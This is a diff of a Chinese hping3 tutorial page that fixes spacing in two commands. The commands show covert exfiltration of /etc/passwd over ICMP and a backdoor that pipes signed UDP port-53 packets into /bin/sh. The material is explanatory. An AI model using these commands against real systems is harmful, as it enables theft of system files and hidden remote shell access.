@@ -113,13 +113,13 @@
 </code></pre>
 <p>监听ICMP包中的签名，根据签名解析出文件内容。</p>
 <p>在发送端使用签名打包的ICMP包发送文件：</p>
-<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.1.108--icmp ?d <span class="token number">100</span> --sign signature --file /etc/passwd
+<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.1.108 --icmp ?d <span class="token number">100</span> --sign signature --file /etc/passwd
 </code></pre>
 <p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
 <h3 id="# 木马功能"># 木马功能</h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
 <p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
 <p>在木马启动端：</p>
-<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.10.66--listen signature --safe --udp -p <span class="token number">53</span> <span class="token operator">|</span> /bin/sh
+<pre><code class="language-shell">hping3 <span class="token number">192.168</span>.10.66 --listen signature --safe --udp -p <span class="token number">53</span> <span class="token operator">|</span> /bin/sh
 </code></pre>
 <p>在远程控制端：</p>
 <pre><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token function">ls</span> <span class="token operator">></span>test.cmd
